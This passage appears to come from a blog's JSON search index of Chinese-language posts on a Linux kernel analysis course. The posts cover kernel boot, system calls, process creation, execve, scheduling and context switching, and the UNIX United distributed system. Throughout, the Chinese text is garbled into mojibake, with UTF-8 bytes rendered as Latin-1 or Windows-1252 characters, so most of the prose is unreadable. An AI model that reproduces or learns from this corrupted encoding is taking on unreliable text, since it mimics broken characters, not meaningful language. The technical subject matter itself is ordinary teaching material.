¸çš„åŸºç¡€æœºåˆ¶ï¼Œå¦‚ä¸­æ–­ï¼Œå†…å­˜ç®¡ç†ï¼Œè¿›ç¨‹ç®¡ç†ï¼Œä¿¡å·ï¼Œæ–‡ä»¶ç³»ç»Ÿï¼ŒKOç­‰ï¼æœ€åå°±å¯åŠ¨ä¸€ä¸ªinitçº¿ç¨‹ï¼Œinitçº¿ç¨‹å†è¯»å–æ–‡ä»¶ç³»ç»Ÿé‡Œçš„initç¨‹åºï¼Œåšä¸ºç³»ç»Ÿçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹è€Œå­˜åœ¨ï¼\nåšå®¢ä¸­å¯¹linuxå¯åŠ¨è¿‡ç¨‹ä¸­çš„start_kernel()å‡½æ•°è¿›è¡Œåˆ†æï¼Œäº†è§£å…¶ä¸»è¦çš„å®ç°åŠŸèƒ½ï¼Œåœ¨è¿™é‡Œï¼Œä¸»è¦å¯¹ä»£ç è¿›è¡Œäº†è§£æã€‚ä¸»è¦è§£æäº†ï¼šstart_kernel() -\u0026gt; rest_init() -\u0026gt; kernel_init() -\u0026gt; å¯åŠ¨initè¿›ç¨‹ã€‚\nLinuxå†…æ ¸åˆ†æè¯¾ç¨‹4_Linuxç³»ç»Ÿè°ƒç”¨\nç³»ç»Ÿè°ƒç”¨ï¼Œé¡¾åæ€ä¹‰ï¼Œè¯´çš„æ˜¯æ“ä½œç³»ç»Ÿæä¾›ç»™ç”¨æˆ·ç¨‹åºè°ƒç”¨çš„ä¸€ç»„â€œç‰¹æ®Šâ€æ¥å£ã€‚ç”¨æˆ·ç¨‹åºå¯ä»¥é€šè¿‡è¿™ç»„â€œç‰¹æ®Šâ€æ¥å£æ¥è·å¾—æ“ä½œç³»ç»Ÿå†…æ ¸æä¾›çš„æœåŠ¡ï¼Œæ¯”å¦‚ç”¨æˆ·å¯ä»¥é€šè¿‡æ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„è°ƒç”¨è¯·æ±‚ç³»ç»Ÿæ‰“å¼€æ–‡ä»¶ã€å…³é—­æ–‡ä»¶æˆ–è¯»å†™æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡æ—¶é’Ÿç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨è·å¾—ç³»ç»Ÿæ—¶é—´æˆ–è®¾ç½®å®šæ—¶å™¨ç­‰ã€‚\nä»é€»è¾‘ä¸Šæ¥è¯´ï¼Œç³»ç»Ÿè°ƒç”¨å¯è¢«çœ‹æˆæ˜¯ä¸€ä¸ªå†…æ ¸ä¸ç”¨æˆ·ç©ºé—´ç¨‹åºäº¤äº’çš„æ¥å£â€”â€”å®ƒå¥½æ¯”ä¸€ä¸ªä¸­é—´äººï¼ŒæŠŠç”¨æˆ·è¿›ç¨‹çš„è¯·æ±‚ä¼ è¾¾ç»™å†…æ ¸ï¼Œå¾…å†…æ ¸æŠŠè¯·æ±‚å¤„ç†å®Œæ¯•åå†å°†å¤„ç†ç»“æœé€å›ç»™ç”¨æˆ·ç©ºé—´ã€‚\nåšå®¢ä¸­è¯¦ç»†çš„åˆ†æäº†ç³»ç»Ÿè°ƒç”¨çš„åŸç†ï¼Œå®ç°æ–¹å¼å’Œæ„ä¹‰ï¼›APIï¼Œç³»ç»Ÿè°ƒç”¨ï¼Œç³»ç»Ÿå‘½ä»¤ï¼Œå†…æ ¸å‡½æ•°ä¹‹é—´çš„åŒºåˆ«ï¼Œæœ€ååˆ†åˆ«ç”¨Cè¯­è¨€å’Œæ±‡ç¼–æ¥å®ç°äº†exitç³»ç»Ÿè°ƒç”¨ã€‚\nLinuxå†…æ ¸åˆ†æè¯¾ç¨‹5_system_callä¸­æ–­å¤„ç†è¿‡ç¨‹\nç³»ç»Ÿè°ƒç”¨æµç¨‹ä»‹ç»ï¼š\næ‰§è¡Œç”¨æˆ·ç¨‹åº(å¦‚:fork,exit) æ ¹æ®glibcä¸­çš„å‡½æ•°å®ç°ï¼Œå–å¾—ç³»ç»Ÿè°ƒç”¨å·å¹¶æ‰§è¡Œint $0x80äº§ç”Ÿä¸­æ–­ã€‚ è¿›è¡Œåœ°å€ç©ºé—´çš„è½¬æ¢å’Œå †æ ˆçš„åˆ‡æ¢ï¼Œæ‰§è¡ŒSAVE_ALLã€‚ï¼ˆè¿›è¡Œå†…æ ¸æ¨¡å¼ï¼‰ è¿›è¡Œä¸­æ–­å¤„ç†ï¼Œæ ¹æ®ç³»ç»Ÿè°ƒç”¨è¡¨è°ƒç”¨å†…æ ¸å‡½æ•°ã€‚ æ‰§è¡Œå†…æ ¸å‡½æ•°ã€‚ æ‰§è¡ŒRESTORE_ALLå¹¶è¿”å›ç”¨æˆ·æ¨¡å¼ æœ¬æ–‡ä¸­ä½¿ç”¨gdbè°ƒè¯•äº†sys_exitç³»ç»Ÿè°ƒç”¨ï¼Œå¹¶å¯¹ç³»ç»Ÿè°ƒç”¨çš„æºä»£ç è¿›è¡Œäº†è¯¦ç»†çš„åˆ†æã€‚\nLinuxå†…æ ¸åˆ†æè¯¾ç¨‹6_è¿›ç¨‹åˆ›å»º\nåœ¨ Linux å†…æ ¸ä¸­,ä¾›ç”¨æˆ·åˆ›å»ºè¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨fork()å‡½æ•°çš„å“åº”å‡½æ•°æ˜¯ sys_fork()ã€sys_clone()ã€sys_vfork()ã€‚è¿™ä¸‰ä¸ªå‡½æ•°éƒ½æ˜¯é€šè¿‡è°ƒç”¨å†…æ ¸å‡½æ•° do_fork() æ¥å®ç°çš„ã€‚\næœ¬ç¯‡åšå®¢è¯¦ç»†åˆ†æäº†è¿›ç¨‹åˆ›å»ºè¿‡ç¨‹(fork())çš„è¯¦ç»†æ‰§è¡Œè¿‡ç¨‹ã€‚\nLinuxå†…æ ¸åˆ†æè¯¾ç¨‹7_execve()å‡½æ•°å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å¤„ç†è¿‡ç¨‹\næ˜”è€…åº„å‘¨æ¢¦ä¸ºè´è¶ï¼Œæ ©æ ©ç„¶è´è¶ä¹Ÿï¼Œè‡ªå–»é€‚å¿—ä¸ï¼Œä¸çŸ¥å‘¨ä¹Ÿã€‚ä¿„ç„¶è§‰ï¼Œåˆ™è˜§è˜§ç„¶å‘¨ä¹Ÿã€‚ä¸çŸ¥å‘¨ä¹‹æ¢¦ä¸ºè´è¶ä¸ï¼Œè´è¶ä¹‹æ¢¦ä¸ºå‘¨ä¸ï¼Ÿå‘¨ä¸è´è¶ï¼Œåˆ™å¿…æœ‰åˆ†çŸ£ã€‚æ­¤ä¹‹è°“ç‰©åŒ–ã€‚ï¼ˆã€Šåº„å­Â·é½ç‰©è®ºã€‹ï¼‰\nåœ¨æˆ‘ä»¬çš„æ“ä½œç³»ç»Ÿä¸­,ä¹Ÿæœ‰å¦‚æ­¤æµªæ¼«æƒ…æ€€çš„åº„ç”Ÿæ¢¦è¶â€”â€“exec()å‡½æ•°æ—.\nåšå®¢ä¸­ä¸­å¯¹exec()å‡½æ•°æ—è¿›è¡Œäº†ä»‹ç»ï¼Œä¹‹åå¯¹do_execve()å‡½æ•°è¿›è¡Œäº†åˆ†æã€‚\nLinuxå†…æ ¸åˆ†æè¯¾ç¨‹8_è¿›ç¨‹è°ƒåº¦ä¸è¿›ç¨‹åˆ‡æ¢è¿‡ç¨‹ è¿›ç¨‹è°ƒåº¦ä¸­schedule()å‡½æ•°é€‰æ‹©ä¸€ä¸ªæ–°çš„è¿›ç¨‹æ¥è¿è¡Œï¼Œå¹¶è°ƒç”¨context_switchè¿›è¡Œä¸Šä¸‹æ–‡çš„åˆ‡æ¢ï¼Œè¿™ä¸ªå®è°ƒç”¨switch_toæ¥è¿›è¡Œå…³é”®ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚\nä¸»è¦è°ƒç”¨è¿‡ç¨‹ï¼š\nnext = pick_next_task(rq, prev);//è¿›ç¨‹è°ƒåº¦ç®—æ³•éƒ½å°è£…è¿™ä¸ªå‡½æ•°å†…éƒ¨ context_switch(rq, prev, next);//è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ switch_toåˆ©ç”¨äº†prevå’Œnextä¸¤ä¸ªå‚æ•°ï¼šprevæŒ‡å‘å½“å‰è¿›ç¨‹ï¼ŒnextæŒ‡å‘è¢«è°ƒåº¦çš„è¿›ç¨‹ åšå®¢ä¸­å¯¹scheduleå‡½æ•°è¿›è¡Œäº†ç›¸å…³ä»‹ç»ï¼Œä»¥åŠåˆ†æäº†scheduleå‡½æ•°çš„å†…æ ¸å®ç°çš„è¯¦ç»†æµç¨‹ã€‚\nLinuxå†…æ ¸åˆ†æè¯¾ç¨‹9_UNIX Unitedæ“ä½œç³»ç»Ÿåˆ†æ\nå­¦ä¹ å¿ƒå¾— å¯¹Linuxç³»ç»Ÿçš„è®¤è¯† å¾ˆå¹¸è¿å‚åŠ äº†è¿™ä¸ºæœŸä¸¤ä¸ªæœˆçš„MOOCè¯¾ç¨‹ã€ŠLinuxå†…æ ¸åˆ†æã€‹ï¼Œè®©æˆ‘å¯¹Linuxç³»ç»Ÿæœ‰äº†æ›´æ·±çš„è®¤è¯†ã€‚\nLinuxç³»ç»Ÿçš„å¼€æºæ€æƒ³æ˜¯æœ€å€¼å¾—æˆ‘ä»¬å­¦ä¹ çš„ï¼Œå¼€æºçš„æ€æƒ³ä¹Ÿä¼šæˆä¸ºæˆ‘ä»¬è½¯ä»¶è¡Œä¸šçš„ä¸»å¯¼çš„ã€‚ Linuxç³»ç»Ÿæœ€ä¸ºæ ¸å¿ƒä¹Ÿå°±æ˜¯è¿›ç¨‹è°ƒåº¦ï¼Œä¸­æ–­å¤„ç†ï¼Œæ—¶é’Ÿå’Œæ–‡ä»¶ç³»ç»Ÿï¼Œæˆ‘ä»¬åªè¦å¯¹è¿™å‡ ä¸ªæ–¹é¢äº†è§£åˆ°äº†ï¼Œä¹Ÿå°±äº†è§£äº†Linuxç³»ç»Ÿçš„å…³é”®äº†ã€‚ å­¦ä¹ Linuxå†…æ ¸çš„å¿ƒå¾— å­¦ä¹ Linuxå†…æ ¸çš„è¿‡ç¨‹ä¹ŸåŠå¹´å¤šäº†ï¼Œä»åµŒå…¥å¼ç³»ç»Ÿè®¾è®¡ä¸­çš„ucosåˆæ­¥è®¤è¯†æ“ä½œç³»ç»Ÿ(æ ¸å¿ƒï¼šè¿›ç¨‹è°ƒåº¦)ï¼ŒåµŒå…¥å¼æ“ä½œç³»ç»Ÿä¸­çš„ï¼ˆARMä¸­çš„Linuxï¼‰å†åˆ°Linuxå†…æ ¸åˆ†æ(x86ä½“ç³»ä¸‹)ï¼Œä¸€æ­¥ä¸€æ­¥çš„æ·±å…¥ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæœ‰å‡ æœ¬ä¹¦å¯¹æˆ‘å½±å“å¾ˆå¤šï¼Œç»™å¤§å®¶æ¨èä¸€ä¸‹:\nã€ŠLinuxå†…æ ¸è®¾è®¡ä¸å®ç°ã€‹ï¼Œæƒ³å­¦ä¹ linuxå†…æ ¸å°±è¦å…ˆäº†è§£ç›¸åº”çš„æœºåˆ¶ä¹‹åå†å»çœ‹æºä»£ç çš„è¯ï¼Œå¯èƒ½ä¼šæ”¶è·åˆ°æ›´å¤šï¼Œè€Œè¿™æœ¬ä¹¦ä»‹ç»äº†è¯¸å¦‚è¿›ç¨‹ç®¡ç†ã€ç³»ç»Ÿè°ƒç”¨ã€ä¸­æ–­å’Œä¸­æ–­å¤„ç†ç¨‹åºã€å†…æ ¸åŒæ­¥ã€æ—¶é—´ç®¡ç†ã€å†…å­˜ç®¡ç†ã€åœ°å€ç©ºé—´ã€è°ƒè¯•æŠ€æœ¯ç­‰æ–¹é¢ï¼Œå†…å®¹æ¯”è¾ƒæµ…æ˜¾æ˜“æ‡‚ï¼Œæ¯”è¾ƒé€‚åˆå­¦ä¹ Linuxå†…æ ¸çš„æ–°äºº.\nä¹‹åå°±ä¸å¾—ä¸æåˆ°ã€Šæ·±å…¥ç†è§£Linuxå†…æ ¸ã€‹è¿™æœ¬ä¹¦äº†ï¼Œè¿™æœ¬æœ€å¥½æ˜¯èƒ½æ·±å…¥å­¦ä¹ ã€‚ç®€è€Œè¨€ä¹‹ï¼Œç¬¬ä¸€æœ¬ï¼Œæçº²æ€§é˜…è¯»ï¼›ç¬¬äºŒæœ¬ï¼Œé€‚åˆæ·±å…¥é˜…è¯»ã€‚\nå½“ç„¶ï¼Œçº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç»çŸ¥æ­¤äº‹è¦èº¬è¡Œï¼›åœ¨ä¹¦æœ¬å­¦ä¹ çš„åŸºç¡€ä¸Šï¼Œéœ€è¦æˆ‘ä»¬åˆ©ç”¨å¥½gdbè¿™ä¸ªè°ƒè¯•å·¥å…·ï¼Œå¤šè·Ÿè¸ªä¸€ä¸‹å†…æ ¸çš„ä¸€äº›æœºåˆ¶çš„æ‰§è¡Œæµç¨‹ï¼Œåœ¨å®è·µä¸­éªŒè¯çŸ¥è¯†ï¼Œæ‰èƒ½æ›´å¥½çš„æŒæ¡çŸ¥è¯†ã€‚\n","date":1434287067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1434287067,"objectID":"eb412d5e2a9d5800de9663c1fbc86cfd","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-catalogue/","publishdate":"2015-06-14T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-catalogue/","section":"post","summary":" å”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\n","tags":"Linux kernel","title":"Linuxå†…æ ¸åˆ†æè¯¾ç¨‹_å­¦ä¹ ç´¢å¼•","type":"post"},{"authors":null,"categories":"Linux","content":"Linuxå†…æ ¸è¯¾ç¬¬ä¹å‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\nUNIXæ“ä½œç³»ç»Ÿï¼Œæ˜¯ä¸€ä¸ªå¼ºå¤§çš„å¤šç”¨æˆ·ã€å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿï¼Œæ”¯æŒå¤šç§å¤„ç†å™¨æ¶æ„ï¼ŒæŒ‰ç…§æ“ä½œç³»ç»Ÿçš„åˆ†ç±»ï¼Œå±äºåˆ†æ—¶æ“ä½œç³»ç»Ÿ\nUNIX United is an architecture for a distributed system based on UNIX. UNIX Unitedå¯ä»¥çœ‹åšæ˜¯ä¸€ç§å¤šå°UNIXç»„æˆåˆ†å¸ƒå¼ç³»ç»Ÿçš„è§£å†³æ–¹æ¡ˆã€‚\n1.Introduction UNIX Unitedç³»ç»Ÿæ˜¯é€šè¿‡å°†ä¸€ç»„çš„UNIXç³»ç»Ÿè®¡ç®—æœºï¼Œåœ¨ä¸Šå±‚å åŠ ä¸€ä¸ªç³»ç»Ÿæ–¹å¼ï¼Œæ˜¯å€¼åœ¨æ“ä½œçš„æ—¶å€™ï¼Œå®Œå…¨éšè—æ‰€æœ‰çš„å¤„ç†å™¨é€šä¿¡å’Œç½‘ç»œåè®®ã€‚å¹¶ä¸”æ‰€æœ‰çš„UNUXå·¥ä½œæ–¹å¼ï¼ˆå¦‚ï¼šè®¾å¤‡ä¿æŠ¤ï¼Œè®¿é—®å’Œæ–‡ä»¶è®¿é—®ï¼Œè¿›ç¨‹é—´é€šä¿¡ï¼Œè¾“å…¥/è¾“å‡ºï¼Œé‡å®šå‘ï¼‰éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå’Œç‹¬ç«‹çš„UNIXæ²¡æœ‰ä»»ä½•å·®åˆ«ã€‚\nå‚è€ƒæ–‡çŒ®ï¼š ã€ŠThe Newcastle Connection or UNIXes of the world Unite!ã€‹ ã€ŠThe Architecture of UNIX Unitedã€‹\nç–‘é—®ï¼šå¯¹æ–‡ä»¶è®¿é—®çš„æ§åˆ¶æ˜¯æ€ä¹ˆå¤„ç†çš„å‘¢ï¼Ÿ\n2.å¯¹æ–‡ä»¶è®¿é—®çš„å¤„ç† ç®€å•çš„ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªç‹¬ç«‹çš„UNIXç³»ç»Ÿä¸»æœºï¼Œç°åœ¨å°†å…¶æ„å»ºæˆUNIX United System, æ„å»ºä¹‹åï¼ŒUNIX1çš„ç”¨æˆ·å¦‚ä½•è¯»å–UNIX2çš„æ–‡ä»¶å‘¢ï¼Ÿ\nä¸çŸ¥é“å¤§å®¶æ˜¯å¦è¿˜è®°å¾—: â€œ / â€ è¡¨ç¤ºæ ¹ç›®å½•ï¼Œâ€œ .. â€è¡¨ç¤ºå½“å‰ç›®å½•çš„ä¸Šä¸€å±‚ç›®å½•ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œâ€œ /.. â€è¡¨ç¤ºä»€ä¹ˆå‘¢ï¼Ÿ\nå¦‚æœåœ¨UNIXï¼‘ä¸»æœºä¸Šå¤åˆ¶æ–‡ä»¶aåˆ°UNIXï¼’ä¸Šï¼Œå¯ä»¥è¿™æ ·æ“ä½œã€‚ cp /user/brian/a /../unix2/user/brian/a ç°åœ¨é—®é¢˜å†ä¸€æ¬¡å‡ºç°ï¼Œè¿™ä¸ªcpä½¿ç”¨çš„æ˜¯UNIX1ä¸­çš„cpè¿˜æ˜¯UNIX2ä¸­çš„cpå‘¢ï¼Ÿ\nï¼“.ç”¨æˆ·è®¤è¯å’Œè®¿é—®æƒé™æ§åˆ¶ UNIXä¸­ç”¨æˆ·è®¤è¯ç›¸å…³çš„æ–‡ä»¶ï¼šç”¨æˆ·ï¼Œç»„ï¼Œç”¨æˆ·å¯†ç ï¼ŒRoot UNIX United Systemä¸­ï¼Œå„ä¸ªå­UNIX Systemæ‹¥æœ‰è‡ªå·±ç‹¬ç«‹çš„users,user groups and user password file,root; ä½†æ¯ä¸ªç³»ç»Ÿéƒ½æœ‰ä¹‰åŠ¡å¯¹è¦ç™»å½•UNIX United Systemçš„ç”¨æˆ·è¿›è¡Œè®¤è¯ï¼Œé‚£æ€ä¹ˆè®¤è¯å‘¢ï¼Ÿ æ¯”å¦‚æœºå™¨Aä¸Šçš„ç”¨æˆ·u, æˆ‘ä»¬è®°ä¸ºâ€œA/uâ€ï¼Œèº«ä»½è®¤è¯ç”±Aå®Œæˆï¼Œä½†ç”¨æˆ·uå¯ä»¥è®¿é—®æ‰€æœ‰Aå’ŒBä¸Šå±äºè¯¥ç”¨æˆ·çš„æ–‡ä»¶ã€‚\n4.è¿æ¥é€šä¿¡-è¿œç¨‹æ–‡ä»¶è®¿é—®çš„å¤„ç† åœ¨åŸæœ‰UNIXçš„åŸºç¡€ä¸Šæ·»åŠ äº†ä¸€ä¸ªé€šä¿¡é“¾è·¯å’Œä¸€ä¸ªè½¯ä»¶å±‚, è¿™ä¸¤éƒ¨åˆ†çš„ä½ç½®åœ¨UNIX Kernelå’ŒUNIX softwareä¹‹é—´ã€‚Newcastle Connectionç›¸å½“äºæ˜¯ä¸€ä¸ªâ€œè¿‡æ»¤å™¨â€ï¼Œè¿‡æ»¤å‡ºè¦é‡å®šå‘å…¶ä»–ç³»ç»Ÿçš„ç³»ç»Ÿè°ƒç”¨ï¼Œè€ŒUNIX1å’ŒUNIX2ä¹‹é—´çš„é€šä¿¡æ˜¯é€šè¿‡è¿œç¨‹è¿‡ç¨‹è°ƒç”¨(Remote Procedure Callï¼ŒRPC)æ¥äº¤æµçš„ã€‚\næµç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š\nä¸Šå±‚åº”ç”¨å‘å‡ºä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼› Newcastle Connectionæ£€æµ‹è¯¥ç³»ç»Ÿè°ƒç”¨æ˜¯ä¸æ˜¯è¿œç¨‹è°ƒç”¨ï¼›ä¸æ˜¯è¿œç¨‹è°ƒç”¨åˆ™ç›´æ¥è½¬æ¢ä¸ºæœ¬åœ°çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆå†…æ ¸æœåŠ¡ï¼‰ï¼›å¦‚æœæ˜¯å¯¹è¿œç¨‹çš„æ–‡ä»¶è¿›ç¨‹æ“ä½œï¼Œåˆ™æ˜¯è¿œç¨‹è°ƒç”¨ã€‚ è¿œç¨‹è°ƒç”¨ï¼Œåˆ™é€šè¿‡è¿æ¥å±‚å°†å‘½ä»¤(åŠ ä¸Šé¢å¤–ä¿¡æ¯ï¼Œå¦‚å½“å‰ç”¨æˆ·id)å‘é€åˆ°è¿œç¨‹ä¸»æœºä¸Šï¼ˆè¿æ¥å±‚ç›¸å½“äºç®¡é“ï¼Œè¿æ¥äº†UNIX1å’ŒUNIX2ï¼‰; è¿æ¥å±‚è§£ææ–‡ä»¶çš„åç§°ï¼ˆå¦‚ï¼š /../UNIX2/ï¼‰å°†å…¶ä¼ é€’ç»™å¯¹åº”çš„è®¡ç®—æœºã€‚ è¿œç¨‹ä¸»æœºè°ƒç”¨å¯¹åº”è¿›ç¨‹æ¥å¤„ç†ï¼ˆå³UNIX Unitedä¸­åªæœ‰æœ¬åœ°æ“ä½œï¼‰ï¼Œè¿œç¨‹ä¸»æœºè¿”å›æ‰§è¡Œæƒ…å†µ ","date":1431003867,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1431003867,"objectID":"97d6a5212667d24ef59a25b07de6ad41","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-UNIX-United-System/","publishdate":"2015-05-07T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-UNIX-United-System/","section":"post","summary":"Linuxå†…æ ¸è¯¾ç¬¬ä¹å‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\n","tags":"Linux kernel","title":"Linuxå†…æ ¸åˆ†æè¯¾ç¨‹9_UNIX Unitedæ“ä½œç³»ç»Ÿåˆ†æ","type":"post"},{"authors":null,"categories":"Linux","content":"Linuxå†…æ ¸è¯¾ç¬¬å…«å‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ ã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\nä¸€.schedule()å‡½æ•°ä»‹ç» ï¼‘.è¿›ç¨‹è°ƒåº¦çš„æ—¶æœº ä¸­æ–­å¤„ç†è¿‡ç¨‹ï¼ˆåŒ…æ‹¬æ—¶é’Ÿä¸­æ–­ã€I/Oä¸­æ–­ã€ç³»ç»Ÿè°ƒç”¨å’Œå¼‚å¸¸ï¼‰ä¸­ï¼Œç›´æ¥è°ƒç”¨schedule()ï¼Œæˆ–è€…è¿”å›ç”¨æˆ·æ€æ—¶æ ¹æ®need_reschedæ ‡è®°è°ƒç”¨schedule()ï¼›\nå†…æ ¸çº¿ç¨‹å¯ä»¥ç›´æ¥è°ƒç”¨**schedule()**è¿›è¡Œè¿›ç¨‹åˆ‡æ¢ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸­æ–­å¤„ç†è¿‡ç¨‹ä¸­è¿›è¡Œè°ƒåº¦ï¼Œä¹Ÿå°±æ˜¯è¯´å†…æ ¸çº¿ç¨‹ä½œä¸ºä¸€ç±»çš„ç‰¹æ®Šçš„è¿›ç¨‹å¯ä»¥ä¸»åŠ¨è°ƒåº¦ï¼Œä¹Ÿå¯ä»¥è¢«åŠ¨è°ƒåº¦ï¼›\nç”¨æˆ·æ€è¿›ç¨‹æ— æ³•å®ç°ä¸»åŠ¨è°ƒåº¦ï¼Œä»…èƒ½é€šè¿‡é™·å…¥å†…æ ¸æ€åçš„æŸä¸ªæ—¶æœºç‚¹è¿›è¡Œè°ƒåº¦ï¼Œå³åœ¨ä¸­æ–­å¤„ç†è¿‡ç¨‹ä¸­è¿›è¡Œè°ƒåº¦ã€‚\n2.è¿›ç¨‹çš„åˆ‡æ¢ ä¸ºäº†æ§åˆ¶è¿›ç¨‹çš„æ‰§è¡Œï¼Œå†…æ ¸å¿…é¡»æœ‰èƒ½åŠ›æŒ‚èµ·æ­£åœ¨CPUä¸Šæ‰§è¡Œçš„è¿›ç¨‹ï¼Œå¹¶æ¢å¤ä»¥å‰æŒ‚èµ·çš„æŸä¸ªè¿›ç¨‹çš„æ‰§è¡Œï¼Œè¿™å«åšè¿›ç¨‹åˆ‡æ¢ã€ä»»åŠ¡åˆ‡æ¢ã€ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼›\næŒ‚èµ·æ­£åœ¨CPUä¸Šæ‰§è¡Œçš„è¿›ç¨‹ï¼Œä¸ä¸­æ–­æ—¶ä¿å­˜ç°åœºæ˜¯ä¸åŒçš„ï¼Œä¸­æ–­å‰åæ˜¯åœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­ï¼Œåªæ˜¯ç”±ç”¨æˆ·æ€è½¬å‘å†…æ ¸æ€æ‰§è¡Œï¼›\nè¿›ç¨‹ä¸Šä¸‹æ–‡åŒ…å«äº†è¿›ç¨‹æ‰§è¡Œéœ€è¦çš„æ‰€æœ‰ä¿¡æ¯ï¼š\nç”¨æˆ·åœ°å€ç©ºé—´: åŒ…æ‹¬ç¨‹åºä»£ç ï¼Œæ•°æ®ï¼Œç”¨æˆ·å †æ ˆç­‰ æ§åˆ¶ä¿¡æ¯: è¿›ç¨‹æè¿°ç¬¦ï¼Œå†…æ ¸å †æ ˆç­‰ ç¡¬ä»¶ä¸Šä¸‹æ–‡ï¼ˆæ³¨æ„ä¸­æ–­ä¹Ÿè¦ä¿å­˜ç¡¬ä»¶ä¸Šä¸‹æ–‡åªæ˜¯ä¿å­˜çš„æ–¹æ³•ä¸åŒï¼‰ 3.å…·ä½“è¿›ç¨‹åˆ‡æ¢çš„ä»£ç åˆ†æ schedule()å‡½æ•°é€‰æ‹©ä¸€ä¸ªæ–°çš„è¿›ç¨‹æ¥è¿è¡Œï¼Œå¹¶è°ƒç”¨context_switchè¿›è¡Œä¸Šä¸‹æ–‡çš„åˆ‡æ¢ï¼Œè¿™ä¸ªå®è°ƒç”¨switch_toæ¥è¿›è¡Œå…³é”®ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼š\nä¸»è¦è°ƒç”¨è¿‡ç¨‹ï¼š\nnext = pick_next_task(rq, prev);//è¿›ç¨‹è°ƒåº¦ç®—æ³•éƒ½å°è£…è¿™ä¸ªå‡½æ•°å†…éƒ¨ context_switch(rq, prev, next);//è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ switch_toåˆ©ç”¨äº†prevå’Œnextä¸¤ä¸ªå‚æ•°ï¼šprevæŒ‡å‘å½“å‰è¿›ç¨‹ï¼ŒnextæŒ‡å‘è¢«è°ƒåº¦çš„è¿›ç¨‹ 1)schedule()å‡½æ•° é¦–å…ˆï¼Œåˆ‡æ¢æ—¶å€™ï¼Œè°ƒç”¨call schedule()ï¼›æ¥æ‰§è¡Œscheduleï¼ˆï¼‰å‡½æ•°ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nä½¿ç”¨struct task_struct *tsk = current; æ¥è·å–å½“å‰è¿›ç¨‹ï¼›sched_submit_work(tsk); é¿å…æ­»é”ï¼›æœ€åè°ƒç”¨ï¼¿schedule()æ¥å¤„ç†åˆ‡æ¢è¿‡ç¨‹\nï¼’)ï¼¿schedule()å‡½æ•° å…¶ä¸­ need_resched:ä¸ºåˆ‡æ¢å‰çš„å˜é‡å‡†å¤‡ï¼š\npreempt_disable()ï¼›//ç¦æ­¢å†…æ ¸æŠ¢å ï¼›\ncpu = smp_processor_id(); //è·å–å½“å‰CPU rq = cpu_rq(cpu); //è·å–è¯¥CPUç»´æŠ¤çš„è¿è¡Œé˜Ÿåˆ—ï¼ˆrun queue)\nrcu_note_context_switch(cpu); //æ›´æ–°å…¨å±€çŠ¶æ€ï¼Œæ ‡è¯†å½“å‰CPUå‘ç”Ÿä¸Šä¸‹æ–‡çš„åˆ‡æ¢\nprev = rq-\u0026gt;curr; //è¿è¡Œé˜Ÿåˆ—ä¸­çš„curræŒ‡é’ˆèµ‹äºˆprevã€‚\nå…¶ä¸­çš„next=pick_next_task(rq, prev)æ¥ç¡®å®šä½¿ç”¨å“ªä¸€ç§è¿›ç¨‹è°ƒåº¦çš„ç­–ç•¥ï¼Œä½†æ€»æ˜¯é€‰æ‹©äº†ä¸‹ä¸€ä¸ªè¿›ç¨‹æ¥è¿›è¡Œåˆ‡æ¢ï¼Œå³æ ¹æ®è°ƒåº¦ç­–ç•¥é€‰æ‹©ä¸€ä¸ªä¼˜å…ˆçº§æœ€é«˜çš„ä»»åŠ¡å°†å…¶å®šä¸ºä¸‹ä¸€ä¸ªè¿›ç¨‹ï¼Œæœ€åéƒ½æ˜¯è°ƒç”¨context_switchæ¥è¿›è¡Œè¿›ç¨‹ä¸Šä¸‹æ–‡çš„åˆ‡æ¢è¿‡ç¨‹ï¼\nï¼“)context_switchå‡½æ•°è§£æ 